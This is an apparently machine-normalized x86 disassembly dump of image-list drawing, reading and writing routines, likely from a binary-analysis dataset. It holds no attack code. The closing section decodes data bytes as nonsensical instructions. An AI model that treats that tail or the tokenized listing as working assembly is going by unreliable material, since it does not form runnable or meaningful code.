mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_428ba0
call sub_424a0c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45a690
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_428ba0
call sub_424a0c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45a690
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_45a690
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ab6a
mov eax [ ebp - 0x10 ]
call sub_403190
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
sub_45ac00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45ac7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_45a9b4
cmp esi eax
jl r-xdata
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
mov eax ebx
mov si 0xffef
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ac86
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
push esi
mov eax ebx
call sub_45a690
push eax
call ImageList_Remove
sub_45ac98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_45a2b8
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_40338c
pop esi
pop ebx
retn
sub_45acd0
push ebx
mov ebx eax
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_45a690
push eax
call ImageList_GetBkColor
call sub_45a2d8
pop ebx
retn
sub_45acf8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_45a2b8
push eax
mov eax ebx
call sub_45acd0
call sub_45a2b8
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_424a0c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_45a690
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_428ba0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_42420c
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_416e34
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_428ba0
pop edx
call sub_4245b0
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_428ba0
call sub_424a0c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_45a690
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_416e34
mov eax [ ebx + 0x54 ]
call sub_428ba0
call sub_424a0c
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_42420c
mov eax edi
call sub_424a0c
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_42420c
mov eax edi
call sub_424a0c
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_429910
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_45aecc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_45aef0
pop ebx
pop ebp
retn 0xc
sub_45aef0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45af3c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_416e34
mov eax [ ebp - 0x4 ]
call sub_45bbd0
xor eax eax
push ebp
push sub_45b0d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45b0b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45b09b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_429910
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b0a2
mov eax [ ebp - 0x10 ]
call sub_403190
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_428ba0
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_4245b0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_424a0c
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_428ba0
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_4245b0
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_424a0c
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45a7cc
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_45b0e4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45a690
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_45af3c
sub_45b104
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax ebx
call sub_45a6f4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418a84
mov eax ebx
call sub_45ac8c
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_45b2ec
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_45a690
mov edx eax
mov eax ebx
call sub_45a594
mov eax ebx
call sub_45a4bc
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_45a690
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_45a4c4
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45a690
push eax
call ImageList_GetBkColor
call sub_45a2d8
mov edx eax
mov eax ebx
call sub_45ac98
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_45b0e4
jmp r-xdata
sub_45b1c4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418b68
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_45b2ec
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_45ac8c
mov eax esi
call sub_45a690
mov edx eax
mov eax ebx
call sub_45a594
mov eax ebx
call sub_45a4bc
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_45a690
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_45a4c4
jmp r-xdata
mov eax esi
call sub_45a690
push eax
call ImageList_GetBkColor
call sub_45a2d8
mov edx eax
mov eax ebx
call sub_45ac98
mov edx esi
mov eax ebx
call sub_45b0e4
pop esi
pop ebx
retn
sub_45b274
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45b2e0
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b2e7
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_45b314
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_418470
mov si 0xffff
call sub_40338c
inc ebp
dec edi
jne r-xdata
sub_45b364
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418360
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418470
cmp ebp eax
jne r-xdata
sub_45b3bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407dac
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45b400
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_45a9b4
mov ebx eax
mov eax edi
call sub_45a9b4
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_45a9b4
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45b4dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45b4bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_45b3bc
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b4c6
mov eax [ ebp - 0xc ]
call sub_403190
retn
mov eax edi
call sub_45a9b4
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_45b4f0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45a9b4
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45b400
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_45b54c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_420acc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_45b4f0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45b5a4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41aacc
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41aacc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45b828
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41a8a0
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41a8c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45b80b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_429910
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_416e34
mov eax [ ebp - 0x4 ]
call sub_45bbd0
xor eax eax
push ebp
push sub_45b7ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b7f5
mov eax [ ebp - 0xc ]
call sub_403190
mov eax [ ebp - 0x14 ]
call sub_403190
mov eax [ ebp - 0x4 ]
call sub_45bbd4
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416e5c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_428ba0
push eax
mov eax [ ebp - 0xc ]
call sub_428ba0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_42447c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416e5c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_428ba0
push eax
mov eax [ ebp - 0x14 ]
call sub_428ba0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_42447c
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45a7cc
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45b838
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42124c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45b898
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45a654
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b89f
mov eax [ ebp - 0xc ]
call sub_403190
retn
sub eax 0xffffffec
sub_45b89f
mov eax [ ebp - 0x4 ]
call sub_45a4bc
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45b9ce
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41a8c0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41afc8
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41a8c0
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403190
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41a8c0
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42124c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45b9b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41a8c0
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45a654
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403190
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41a8c0
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_45ba00
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_45a6f4
mov eax edi
call sub_41a8a0
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41a8c0
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_45b5a4
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_45b838
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45ba8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42124c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45bb86
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c0b4
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_45a690
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_45a690
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bb8d
mov eax [ ebp - 0x4 ]
call sub_403190
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
jmp r-xdata
sub_45bbf4
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
mov edx esi
call sub_45b364
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_45bc40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45bc65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bc6c
retn
sub_45c0bc
clc
push edx
push ecx
[ ebx + edi * 8 - 0xa63ffbb ]
inc ebp
add [ esi + esi * 8 + 0x45 ] ch
add [ esi + esi * 8 - 0x4f3ffbb ] ah
inc ebp
add al bh
cli
inc ebp
add al bh
inc ebp
add [ ecx ] cl
push esp
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x45bcd070
add [ eax ] cl
add bh bh
cld
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
inc ebx
push 0xbc6b6365
mov esi 0x3b0045
add bh bh
sub al 0x6
inc esi
add [ ecx ] al
arpl [ ebx - 0x44 ] bp
insd
in al dx
rol [ ebp ] 0x7
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
add [ eax ] al
call eax
hlt
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
jl r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
outsd
outsb
add [ eax ] dl
